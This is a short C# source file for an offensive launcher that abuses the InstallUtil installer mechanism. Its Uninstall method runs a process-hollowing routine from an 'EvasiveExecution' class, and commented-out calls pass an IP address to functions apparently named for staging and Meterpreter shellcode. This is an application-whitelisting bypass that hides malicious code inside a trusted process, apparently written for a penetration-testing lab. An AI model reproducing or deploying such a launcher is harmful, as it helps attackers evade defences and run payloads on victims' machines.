using System;

namespace Execution
{
    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Console.WriteLine("Executing");
            //Execution.Func.EvasiveExecution.Prepare("192.168.49.120");
            //Execution.Func.EvasiveExecution.MetShc("192.168.49.120");
            Execution.Func.EvasiveExecution.ProcessHollowingExec();
        }
    }
}
